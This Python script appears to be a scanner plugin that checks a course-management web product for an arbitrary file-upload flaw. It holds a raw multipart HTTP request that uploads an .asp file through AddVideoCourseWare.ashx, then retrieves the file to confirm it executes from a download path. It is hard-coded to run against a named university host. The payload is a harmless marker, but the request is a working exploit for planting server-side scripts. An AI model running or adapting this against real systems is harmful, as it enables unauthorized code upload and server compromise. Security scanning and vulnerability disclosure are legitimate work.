#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://wooyun.org/bugs/wooyun-2010-099059
def assign(service, arg):
    if service == "able_g2s":
        return True, arg

def audit(arg):
    raw = """POST AdminSpace/PublicClass/AddVideoCourseWare.ashx?action=UploadImage HTTP/1.1
Host: kczx.sus.edu.cn
Content-Length: 563
Origin: http://kczx.sus.edu.cn
X-Requested-With: ShockwaveFlash/17.0.0.188
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.130 Chrome/43.0.2357.130 Safari/537.36
Content-Type: multipart/form-data; boundary=----------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: ASP.NET_SessionId=a50pid55regfww55fticke45; ASPSESSIONIDCSQCRDCB=OJIBGEKDDNFGACCBKDCCJKDH

------------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6
Content-Disposition: form-data; name="Filename"

asp.asp
------------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6
Content-Disposition: form-data; name="folder"

/G2S/AdminSpace/PublicClass/
------------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6
Content-Disposition: form-data; name="Filedata"; filename="asp.asp"
Content-Type: application/octet-stream

zddfggsfagsdfhdfjskjhsdfkfk
------------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6
Content-Disposition: form-data; name="Upload"

Submit Query
------------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6--"""
    url = arg + 'G2S/AdminSpace/PublicClass/AddVideoCourseWare.ashx?action=UploadImage'
    code, head,res, errcode, _ = curl.curl2(url,raw=raw)
    if '.asp' not in res or '<' in res:
        return
    url = arg + 'download/' + res
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and 'zddfggsfagsdfhdfjskjhsdfkfk' in res:
        security_hole(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('able_g2s', 'http://kczx.sus.edu.cn/')[1])